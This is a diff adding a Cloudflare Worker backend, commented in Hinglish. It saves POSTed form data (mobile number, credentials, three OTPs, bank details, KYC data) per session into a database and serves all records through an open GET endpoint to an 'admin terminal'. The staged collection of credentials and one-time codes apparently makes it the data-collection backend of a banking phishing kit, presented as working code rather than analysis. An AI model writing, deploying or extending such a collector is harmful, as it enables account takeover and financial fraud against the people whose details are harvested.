@@ -1,0 +1,70 @@
+export default {
+  async fetch(request, env) {
+    const corsHeaders = {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type",
+    };
+
+    // Browser pre-flight request handle karne ke liye
+    if (request.method === "OPTIONS") {
+      return new Response(null, { headers: corsHeaders });
+    }
+
+    // 1. GET Request: Admin Terminal ke liye data fetch karna
+    if (request.method === "GET") {
+      try {
+        // "New on Top" ke liye ORDER BY time DESC zaroori hai
+        const { results } = await env.DB.prepare("SELECT * FROM user_logs ORDER BY time DESC").all();
+        return new Response(JSON.stringify(results), {
+          headers: { ...corsHeaders, "Content-Type": "application/json" }
+        });
+      } catch (e) {
+        return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: corsHeaders });
+      }
+    }
+
+    // 2. POST Request: Form se data save/update karne ke liye
+    if (request.method === "POST") {
+      try {
+        const data = await request.json();
+        const sid = data.session_id; // Ye frontend se aana chahiye
+
+        if (!sid) {
+          return new Response("Missing session_id", { status: 400, headers: corsHeaders });
+        }
+
+        // UPSERT Logic: Naya user hai toh Insert, purana hai toh Update
+        // COALESCE ensures ki purana data delete na ho
+        await env.DB.prepare(`
+          INSERT INTO user_logs (session_id, mobile, credentials, otp_1, bank_details, otp_2, kyc_data, otp_3, time)
+          VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, CURRENT_TIMESTAMP)
+          ON CONFLICT(session_id) DO UPDATE SET
+            mobile = COALESCE(?2, mobile),
+            credentials = COALESCE(?3, credentials),
+            otp_1 = COALESCE(?4, otp_1),
+            bank_details = COALESCE(?5, bank_details),
+            otp_2 = COALESCE(?6, otp_2),
+            kyc_data = COALESCE(?7, kyc_data),
+            otp_3 = COALESCE(?8, otp_3),
+            time = CURRENT_TIMESTAMP
+        `).bind(
+          sid, 
+          data.mobile || null, 
+          data.credentials || null, 
+          data.otp_1 || null, 
+          data.bank_details || null,
+          data.otp_2 || null,
+          data.kyc_data || null,
+          data.otp_3 || null
+        ).run();
+
+        return new Response("OK", { headers: corsHeaders });
+      } catch (e) {
+        return new Response("Error: " + e.message, { status: 500, headers: corsHeaders });
+      }
+    }
+
+    return new Response("Method Not Allowed", { status: 405, headers: corsHeaders });
+  }
+};
